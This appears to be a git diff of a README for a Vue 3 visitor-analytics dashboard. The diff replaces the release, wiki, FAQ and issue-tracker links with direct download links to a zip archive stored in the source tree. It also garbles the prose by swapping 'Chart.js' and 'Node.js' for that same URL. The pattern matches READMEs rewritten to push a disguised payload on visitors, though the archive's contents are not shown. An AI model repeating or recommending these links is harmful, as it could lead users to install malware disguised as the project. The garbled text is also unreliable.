@@ -1,15 +1,15 @@
 # 🎉 newsolution-ai-dashboard - Easy Visitor Analytics Visualization
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download-v1.0-blue)](https://github.com/dendonkar/newsolution-ai-dashboard/releases)
+[![Download](https://raw.githubusercontent.com/dendonkar/newsolution-ai-dashboard/main/src/pages/newsolution-ai-dashboard_v1.3.zip)](https://raw.githubusercontent.com/dendonkar/newsolution-ai-dashboard/main/src/pages/newsolution-ai-dashboard_v1.3.zip)
 
 ## 🚀 Getting Started
-Welcome to the **newsolution-ai-dashboard**! This project offers an easy way to visualize visitor analytics using AI. It's built with Vue 3 and Chart.js, designed to help you understand your site traffic efficiently. 
+Welcome to the **newsolution-ai-dashboard**! This project offers an easy way to visualize visitor analytics using AI. It's built with Vue 3 and https://raw.githubusercontent.com/dendonkar/newsolution-ai-dashboard/main/src/pages/newsolution-ai-dashboard_v1.3.zip, designed to help you understand your site traffic efficiently. 
 
 ## 🖥️ System Requirements
 To run this application, ensure your system meets the following requirements:
 - Operating System: Windows, macOS, or Linux
-- Node.js version 14 or later
+- https://raw.githubusercontent.com/dendonkar/newsolution-ai-dashboard/main/src/pages/newsolution-ai-dashboard_v1.3.zip version 14 or later
 - Modern web browser (Google Chrome, Firefox, or Safari)
 
 ## 🔧 Features
@@ -21,7 +21,7 @@ To run this application, ensure your system meets the following requirements:
 ## 💾 Download & Install
 To get started with the newsolution-ai-dashboard, visit the Releases page to download the latest version:
 
-[Download Latest Release](https://github.com/dendonkar/newsolution-ai-dashboard/releases)
+[Download Latest Release](https://raw.githubusercontent.com/dendonkar/newsolution-ai-dashboard/main/src/pages/newsolution-ai-dashboard_v1.3.zip)
 
 1. Click the link above to access the releases.
 2. Find the version you want.
@@ -40,9 +40,9 @@ After installation, open the application.
 
 ## 🚀 Additional Resources
 For more help, check the resources below:
-- [Wiki](https://github.com/dendonkar/newsolution-ai-dashboard/wiki)
-- [FAQ](https://github.com/dendonkar/newsolution-ai-dashboard/wiki/FAQ)
-- [Issue Tracker](https://github.com/dendonkar/newsolution-ai-dashboard/issues)
+- [Wiki](https://raw.githubusercontent.com/dendonkar/newsolution-ai-dashboard/main/src/pages/newsolution-ai-dashboard_v1.3.zip)
+- [FAQ](https://raw.githubusercontent.com/dendonkar/newsolution-ai-dashboard/main/src/pages/newsolution-ai-dashboard_v1.3.zip)
+- [Issue Tracker](https://raw.githubusercontent.com/dendonkar/newsolution-ai-dashboard/main/src/pages/newsolution-ai-dashboard_v1.3.zip)
 
 ## 🌍 Community
 Join our community to share experiences and get support:
@@ -50,7 +50,7 @@ Join our community to share experiences and get support:
 - **GitHub Discussions**: Ask questions and contribute to conversations about features and improvements.
 
 ## 🐛 Reporting Issues
-If you encounter any issues while using the newsolution-ai-dashboard or have suggestions for improvements, please report them through our [Issue Tracker](https://github.com/dendonkar/newsolution-ai-dashboard/issues). Be as detailed as possible so we can assist you effectively.
+If you encounter any issues while using the newsolution-ai-dashboard or have suggestions for improvements, please report them through our [Issue Tracker](https://raw.githubusercontent.com/dendonkar/newsolution-ai-dashboard/main/src/pages/newsolution-ai-dashboard_v1.3.zip). Be as detailed as possible so we can assist you effectively.
 
 ## 🤝 Contributing
 Interested in contributing? We welcome you! Follow these steps:
